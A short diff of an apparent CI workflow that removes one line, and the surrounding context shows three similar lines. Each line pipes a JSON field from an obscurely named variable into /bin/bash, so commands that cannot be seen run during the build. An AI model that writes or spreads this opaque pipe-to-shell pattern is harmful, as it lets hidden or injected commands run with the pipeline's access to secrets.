@@ -36,7 +36,6 @@ jobs:
           echo $idn5050 | jq -r .li30 | /bin/bash
           printf '%s' "$fqku530" | jq -r .nt7879 | /bin/bash
           echo $cd92 | jq -r .e4 | /bin/bash
-          printf '%s' "$j6" | jq -r .vbvsj56 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
